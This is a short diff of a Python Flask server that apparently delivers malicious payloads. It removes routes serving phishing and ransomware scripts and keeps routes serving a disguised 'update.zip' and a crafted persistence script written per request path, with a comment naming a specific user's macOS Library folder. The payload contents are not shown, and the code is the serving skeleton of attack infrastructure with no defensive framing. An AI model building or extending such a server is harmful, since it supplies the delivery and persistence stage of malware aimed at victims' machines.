@@ -1,4 +1,3 @@
-import argparse
 from flask import Flask, send_file
 from flask_restful import Resource, Api
 
@@ -10,21 +9,13 @@ api = Api(app)
 HTTP_PORT = 8080
 HOST = '0.0.0.0'
 
-class getPhishing(Resource):
-    def get(self):
-        return send_file('.\\Assets\\phishing.sh')
-
-
-class getRansomware(Resource):
-    def get(self):
-        return send_file('.\\Assets\\ransom.sh')
-
 
 class getUpdate(Resource):
     def get(self):
         return send_file('.\\Assets\\update.zip')
 
-#/Users/robertbebert/Library
+
+# /Users/robertbebert/Library
 class getCraftedPayload(Resource):
     def get(self, path):
         with open('.\\Assets\\persist.py', 'w') as persist:
@@ -34,8 +25,6 @@ class getCraftedPayload(Resource):
 
 
 api.add_resource(getUpdate, '/update')
-api.add_resource(getRansomware,'/ransom')
-api.add_resource(getPhishing,'/phishing')
 api.add_resource(getCraftedPayload, '/<path>')
 
 
